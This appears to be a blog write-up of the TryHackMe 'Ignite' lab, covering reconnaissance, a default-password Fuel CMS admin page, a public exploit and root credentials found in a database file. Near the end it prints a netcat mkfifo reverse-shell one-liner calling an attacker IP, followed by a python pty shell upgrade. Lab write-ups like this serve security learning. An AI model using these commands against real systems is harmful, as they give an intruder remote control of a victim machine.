---
layout: post
title: "Ignite"
author: "Nicholas Coleman"
date: 2025-04-11
tags: tryhackme
---

### Info

IP: `10.10.233.34`

### Nmap

![nmap](/security.github.io/images/ignite/first.png)

Website:

![site](/security.github.io/images/ignite/2.png)

Gobuster:

![gobuster](/security.github.io/images/ignite/3.png)

Exploits:

![exploit](/security.github.io/images/ignite/4.png)

Since the admin did not change their default password, it seems I can just login without having to brute force anything, or figure it out. 

The admin page is located at: `http://10.10.233.34/fuel`

This brings me to a CMS, where there is very little information.

I decide to now just try out an exploit I found called FuelCMS which grants me a reverse shell. 

![shell](/security.github.io/images/ignite/8.png)

Bingo!

![bingo](/security.github.io/images/ignite/9.png)

I was able to find the user.txt flag pretty easily. 

Looking around, I was able to find a database file:

![10](/security.github.io/images/ignite/10.png)

Root user found! Now I have to escalate. 

`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.25.18 4242 > /tmp/f`

This spawns a terminal so that I can login to root:

`python -c 'import pty; pty.spawn("/bin/sh")'`

![final](/security.github.io/images/ignite/11.png)

